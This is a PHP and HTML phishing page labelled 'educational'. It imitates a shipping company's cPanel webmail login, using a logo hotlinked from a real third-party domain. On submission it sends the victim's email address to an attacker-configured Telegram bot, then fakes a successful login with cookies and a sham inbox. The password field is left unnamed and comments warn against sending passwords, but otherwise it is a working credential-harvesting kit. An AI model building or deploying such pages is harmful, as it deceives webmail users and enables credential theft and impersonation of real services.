<?php
/* ===============================
   EDUCATIONAL TELEGRAM FUNCTION
   =============================== */

function sendToTelegram($message) {
    $botToken = "YOUR_BOT_TOKEN_HERE"; // DO NOT COMMIT REAL TOKENS
    $chatId   = "YOUR_CHAT_ID_HERE";

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

    $data = [
        "chat_id" => $chatId,
        "text" => $message,
        "parse_mode" => "HTML"
    ];

    $options = [
        "http" => [
            "method"  => "POST",
            "header"  => "Content-Type: application/x-www-form-urlencoded",
            "content" => http_build_query($data)
        ]
    ];

    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

/* ===============================
   EDUCATIONAL LOGIN HANDLER
   =============================== */

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    $email = htmlspecialchars($_POST["email"] ?? "");

    // ❗ EDUCATIONAL: DO NOT SEND PASSWORDS
    sendToTelegram("📨 <b>Login Attempt</b>\nEmail: {$email}");

    // Fake success for demo
    setcookie("loggedIn", "true", time()+86400, "/");
    setcookie("username", $email, time()+86400, "/");

    header("Location: index.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Shipping Webmail Portal (Educational)</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: "Segoe UI", Arial, sans-serif;
  background:
    linear-gradient(rgba(10,102,194,.75), rgba(0,63,127,.85)),
    url("https://images.unsplash.com/photo-1605745341112-85968b19335b");
  background-size: cover;
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}

.box {
  background: #fff;
  width: 100%;
  max-width: 420px;
  padding: 36px;
  border-radius: 10px;
  box-shadow: 0 25px 60px rgba(0,0,0,.35);
}

.logo {
  text-align: center;
  margin-bottom: 20px;
}

.logo img {
  width: 150px;
}

label {
  font-size: 13px;
  color: #666;
}

input {
  width: 100%;
  padding: 12px;
  margin-top: 6px;
  margin-bottom: 18px;
  border: 1px solid #ccc;
  border-radius: 4px;
}

button {
  width: 100%;
  padding: 12px;
  background: #0a66c2;
  color: #fff;
  border: none;
  border-radius: 4px;
  font-size: 15px;
  cursor: pointer;
}

.footer {
  text-align: center;
  margin-top: 20px;
  font-size: 12px;
  color: #666;
}
</style>
</head>

<body>

<?php if (!isset($_COOKIE["loggedIn"])): ?>

<div class="box">
  <div class="logo">
    <img src="https://webmail.thomsonmx.com/cPanel_magic_revision_1668371294/unprotected/cpanel/images/webmail-logo.svg">
  </div>

  <form method="POST" action="">
    <label>Email address</label>
    <input type="email" name="email" required>

    <label>Password</label>
    <input type="password" required>

    <button type="submit">Sign in</button>
  </form>

  <div class="footer">
    © <?= date("Y") ?> Your Shipping Company
  </div>
</div>

<?php else: ?>

<div class="box" style="text-align:center">
  <h2>Inbox</h2>
  <p>Welcome, <b><?= htmlspecialchars($_COOKIE["username"]) ?></b></p>

  <form method="POST" action="logout.php">
    <button>Logout</button>
  </form>
</div>

<?php endif; ?>

</body>
</html>
